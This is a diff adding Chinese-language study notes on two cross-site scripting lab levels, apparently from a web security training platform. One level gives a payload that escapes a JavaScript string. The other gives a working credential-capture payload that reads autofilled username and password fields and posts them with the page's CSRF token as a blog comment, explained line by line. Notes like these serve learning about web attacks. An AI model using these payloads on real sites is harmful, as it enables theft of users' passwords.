@@ -143,6 +143,43 @@ document.addEventListener("DOMContentLoaded", () => {
              name=Hacked&email=test%40test.com&website=https%3A%2F%2Ftest.com发论坛需要name,email,website,格式必有
 
 ##总结：进不去内网，外部通讯失效，从旁系入手，一个不起眼的管理员权限也不小
+
+##关卡十七：Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+**攻击payload**:\'-alert(1)//
+**原理**：1.\反斜杠，输入浏览器会变成 var searchTerms='\\'转义将原本的效果抵消了
+          2.-减号让JS按规则减法执行，会直接执行alert(1)
+          3.//注释掉后续内容
+
+##关卡十八：Exploiting cross-site scripting to capture passwords
+**攻击payload**:
+<input name=username id=username>
+<input type=password name=password autofocus onfocus="if(this.value.length)fetch('/post/comment',{
+method:'POST',
+headers:{'Content-Type':'application/x-www-form-urlencoded'},
+body:'csrf='+document.querySelector('input[name=csrf]').value+'&postId=1&comment='+username.value+':'+this.value+'&name=Hacked&email=test%40test.com'
+});">
+**原理**：1.<input name=username id=username>：
+               <input>标签用来放name用户名  name=username提交时用这个  定义一个id后面用
+          2.<input type=password name=password autofocus onfocus：
+                <input type=password>密码框  name=password表单名  autofocus光标强制锁定到密码框
+          3.onfocus="if(this.value.length)
+                onfocus:光标进入立刻执行后面的代码   if(this.value.length)有东西然后再拿下
+4.fetch('/post/comment',{
+  method:'POST',
+  headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'csrf='+document.querySelector('input[name=csrf]').value+'&postId=1&comment='+username.value+':'+this.value+'&name=Hacked&email=test%40test.com'
+  });">      
+        fetch('/post/comment'评论区内部暗号【自己人放行】
+        method:'POST'【评论的post请求】
+        headers:{'Content-Type':'application/x-www-form-urlencoded'}【标准化，正规军】
+        document.querySelector('input[name=csrf]').value【找到目标，将他送到指定位置】
+        postId=1【位置】
+        comment='+username.value+':'+this.value将账号密码放一块贴到大屏【处理结果斩首示众】
+        &name=Hacked&email=test%40test.com'【评论必填项】
+           
+
+
+
              
           
 
